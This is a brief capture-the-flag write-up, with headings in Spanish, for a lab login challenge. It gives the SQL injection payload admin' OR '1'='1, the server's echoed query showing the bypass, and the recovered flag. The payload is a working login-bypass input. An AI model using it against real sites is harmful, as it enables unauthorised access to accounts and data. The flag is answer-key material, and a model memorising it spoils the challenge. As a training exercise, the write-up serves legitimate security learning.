## Descripción 
Can you login to this website? Try to login [here](http://chatelaine.cylabacademy.net:35876/).
## Solución 
```admin' OR '1'='1
|   |
|---|
|<pre>username: admin&#039; OR &#039;1&#039;=&#039;1|
|password: admin|
|SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; OR &#039;1&#039;=&#039;1&#039; AND password=&#039;admin&#039;|
|</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: academy{L00k5_l1k3_y0u_solv3d_it_8fcb45de}</p>|

```
academy{L00k5_l1k3_y0u_solv3d_it_8fcb45de}
## Notas adicionales 
* admin' OR '1'='1 Es una de las vulnerabilidades más antiguas y críticas de la web. Permite saltarse pantallas de inicio de sesión manipulando entradas de texto
## Referencias
